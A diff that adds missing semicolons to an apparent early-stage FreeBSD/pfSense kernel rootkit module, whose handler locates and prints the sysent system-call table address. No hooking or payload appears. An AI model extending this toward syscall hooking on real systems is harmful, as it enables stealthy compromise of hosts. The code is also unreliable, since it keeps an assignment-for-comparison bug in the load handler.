@@ -38,12 +38,12 @@ static int find_sysent_table (void) {
     // The sysent table should be global in freeBSD/pfSense
     syscall_table = sysent;
     if (syscall_table) {
-        uprintf("Table found at address: %p\n", syscall_table)
-        return 0
+        uprintf("Table found at address: %p\n", syscall_table);
+        return 0;
     }
     else {
-        uprintf("Table not found.\n")
-        return 1
+        uprintf("Table not found.\n");
+        return 1;
     }
 }
 
@@ -60,15 +60,15 @@ static int find_sysent_table (void) {
 static int rootkit_handler(struct module *module, int event, void *arg) {
 
     // This is the result of looking for the memory address of the sysent table, it will be 0 if successfull and anything else for other cases
-    int search_table_case = 0
+    int search_table_case = 0;
     switch (event) {
     case MOD_LOAD:
         search_table_case = find_sysent_table();
         if (search_table_case = 0) {
-            uprintf("No error with finding sysent table address.\n")
+            uprintf("No error with finding sysent table address.\n");
         }
         else {
-            uprintf("sysent table not found.\n")
+            uprintf("sysent table not found.\n");
         }
         break;
     case MOD_UNLOAD:
